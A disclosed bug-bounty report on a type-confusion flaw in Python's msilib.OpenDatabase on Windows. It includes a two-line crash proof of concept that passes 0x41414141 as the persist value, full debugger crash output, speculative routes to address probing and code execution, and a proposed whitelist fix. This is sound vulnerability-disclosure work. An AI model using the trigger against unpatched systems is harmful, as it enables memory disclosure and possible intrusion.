# msilib.OpenDatabase Type Confusion

## Report Details
- **Report ID**: 167688
- **URL**: https://hackerone.com/reports/167688
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-09-12T04:21:54.616Z
- **Disclosed**: 2016-09-20T05:38:52.437Z

## Reporter
- **Username**: johnleitch
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
I have reported a vulnerability in Python that is now fixed. My patch was accepted with minor changes.

---

http://bugs.python.org/issue24594

The msilib.OpenDatabase method suffers from a type confusion vulnerability caused by the behavior of MsiOpenDatabase(), the underlying win32 function utilized. This is due to the unorthodox handling of the szPersist parameter: when an MSIDBOPEN_* value is passed, it is treated as a predefined persistence mode. However, when a larger value is passed, it is treated as a string pointer, which is used as the path to a new file.

Because the Python method msilib.OpenDatabase passes its persist parameter through to MsiOpenDatabase, it may be possible for an attacker to trigger the type confusion bug should the seemingly innocuous persist parameter be exposed as attack surface. This could have a few consequences: 

1) An attacker might be able to leverage this vulnerability to probe for valid addresses, which could then be used in another exploit to bypass ASLR/DEP.
2) An attacker might be able to leverage this vulnerability to dereference aribtrary values in memory, disclosing secrets. 
3) An attacker may be able to spray memory with specially crafted string values, then leverage this vulnerability to pass one of the values as a persist string. Because this would lead to the creation of an MSI file in a location now controlled by the attacker, it could potentially be exploited to achieve remote code execution.

A Python script that demonstrates the vulnerability is as follows:

import msilib
msilib.OpenDatabase("",0x41414141)

And it produces the following exception:

0:000> r
eax=41414141 ebx=00000000 ecx=0027f8c0 edx=41414142 esi=0027f8c0 edi=00000000
eip=757252aa esp=0027f874 ebp=0027f89c iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
KERNELBASE!lstrlenA+0x1a:
757252aa 8a08            mov     cl,byte ptr [eax]          ds:002b:41414141=??
0:000> !analyze -v -nodb
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************


FAULTING_IP: 
KERNELBASE!lstrlenA+1a
757252aa 8a08            mov     cl,byte ptr [eax]

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 757252aa (KERNELBASE!lstrlenA+0x0000001a)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: 41414141
Attempt to read from address 41414141

CONTEXT:  00000000 -- (.cxr 0x0;r)
eax=41414141 ebx=00000000 ecx=0027f8c0 edx=41414142 esi=0027f8c0 edi=00000000
eip=757252aa esp=0027f874 ebp=0027f89c iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
KERNELBASE!lstrlenA+0x1a:
757252aa 8a08            mov     cl,byte ptr [eax]          ds:002b:41414141=??

FAULTING_THREAD:  00000d38

PROCESS_NAME:  python.exe

ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.

EXCEPTION_PARAMETER1:  00000000

EXCEPTION_PARAMETER2:  41414141

READ_ADDRESS:  41414141 

FOLLOWUP_IP: 
msi!CApiConvertString::operator unsigned short const *+1b1d
622e1fa1 40              inc     eax

NTGLOBALFLAG:  70

APPLICATION_VERIFIER_FLAGS:  0

APP:  python.exe

ANALYSIS_VERSION: 6.3.9600.17029 (debuggers(dbg).140219-1702) x86fre

BUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_READ_FILL_PATTERN_41414141

PRIMARY_PROBLEM_CLASS:  INVALID_POINTER_READ_FILL_PATTERN_41414141

DEFAULT_BUCKET_ID:  INVALID_POINTER_READ_FILL_PATTERN_41414141

LAST_CONTROL_TRANSFER:  from 622e1fa1 to 757252aa

STACK_TEXT:  
0027f89c 622e1fa1 41414141 41414141 623e22d0 KERNELBASE!lstrlenA+0x1a
0027fcfc 1d162217 01c54334 41414141 0027fd10 msi!CApiConvertString::operator unsigned short const *+0x1b1d
0027fd18 1e0aafd7 00000000 01d86940 01d7ea08 _msi!msiopendb+0x37
0027fd30 1e0edd10 01d7ea08 01d86940 00000000 python27!PyCFunction_Call+0x47
0027fd5c 1e0f017a 0027fdb4 01c86b18 01c86b18 python27!call_function+0x2b0
0027fdcc 1e0f1150 01cb4030 00000000 01c86b18 python27!PyEval_EvalFrameEx+0x239a
0027fe00 1e0f11b2 01c86b18 01cb4030 01c8aa50 python27!PyEval_EvalCodeEx+0x690
0027fe2c 1e11707a 01c86b18 01c8aa50 01c8aa50 python27!PyEval_EvalCode+0x22
0027fe44 1e1181c5 01d43a20 01c8aa50 01c8aa50 python27!run_mod+0x2a
0027fe64 1e118760 68e87408 003f2e93 00000101 python27!PyRun_FileExFlags+0x75
0027fea4 1e1190d9 68e87408 003f2e93 00000001 python27!PyRun_SimpleFileExFlags+0x190
0027fec0 1e038d35 68e87408 003f2e93 00000001 python27!PyRun_AnyFileExFlags+0x59
0027ff3c 1d00116d 00000002 003f2e70 003f1940 python27!Py_Main+0x965
0027ff80 75847c04 7ffde000 75847be0 0c2f39c0 python!__tmainCRTStartup+0x10f
0027ff94 77c9b90f 7ffde000 0e681648 00000000 KERNEL32!BaseThreadInitThunk+0x24
0027ffdc 77c9b8da ffffffff 77c806e0 00000000 ntdll!__RtlUserThreadStart+0x2f
0027ffec 00000000 1d001314 7ffde000 00000000 ntdll!_RtlUserThreadStart+0x1b


STACK_COMMAND:  .cxr 0x0 ; kb

SYMBOL_STACK_INDEX:  1

SYMBOL_NAME:  msi!CApiConvertString::operator unsigned short const *+1b1d

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: msi

IMAGE_NAME:  msi.dll

DEBUG_FLR_IMAGE_TIMESTAMP:  5450468f

FAILURE_BUCKET_ID:  INVALID_POINTER_READ_FILL_PATTERN_41414141_c0000005_msi.dll!CApiConvertString::operator_unsigned_short_const_*

BUCKET_ID:  APPLICATION_FAULT_INVALID_POINTER_READ_FILL_PATTERN_41414141_msi!CApiConvertString::operator_unsigned_short_const_*+1b1d

ANALYSIS_SOURCE:  UM

FAILURE_ID_HASH_STRING:  um:invalid_pointer_read_fill_pattern_41414141_c0000005_msi.dll!capiconvertstring::operator_unsigned_short_const_*

FAILURE_ID_HASH:  {11693fba-32c4-0880-2440-574cbd780159}

Followup: MachineOwner
---------

To fix the issue, msiopendb() should perform whitelist validation of the persist value to confirm that it is a valid MSIDBOPEN_* constant. A proposed patch is attached.

## Attachments
No attachments
